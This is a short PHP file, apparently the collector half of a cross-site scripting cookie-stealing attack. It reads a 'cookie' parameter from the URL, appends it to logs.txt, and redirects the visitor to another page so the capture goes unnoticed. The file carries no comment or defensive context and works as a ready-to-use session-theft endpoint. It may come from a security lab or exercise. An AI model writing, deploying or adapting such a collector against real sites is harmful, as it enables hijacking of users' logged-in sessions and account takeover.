<?php 
    $session = $_GET['cookie'];
    file_put_contents("logs.txt", $session);
    header("Location: ../index_1.php");
?>